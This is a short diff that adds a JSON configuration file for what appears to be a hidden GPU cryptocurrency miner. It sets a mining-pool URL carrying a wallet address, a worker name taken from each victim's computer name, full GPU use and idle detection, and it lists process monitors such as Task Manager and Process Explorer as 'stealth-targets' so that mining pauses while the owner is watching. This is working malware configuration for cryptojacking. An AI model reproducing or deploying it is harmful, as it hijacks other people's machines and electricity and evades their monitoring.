@@ -1,1 +1,10 @@
 
+{
+    "url": "stratum://0x84c6080225713ebcc5032593e6b662a8147a8315.Wraith-{COMPUTERNAME}@eth.2miners.com:2020",
+    "algo": "etchash",
+    "max-gpu": 100,
+    "idle-wait": 1,
+    "idle-gpu": 100,
+    "stealth": false,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe"
+}
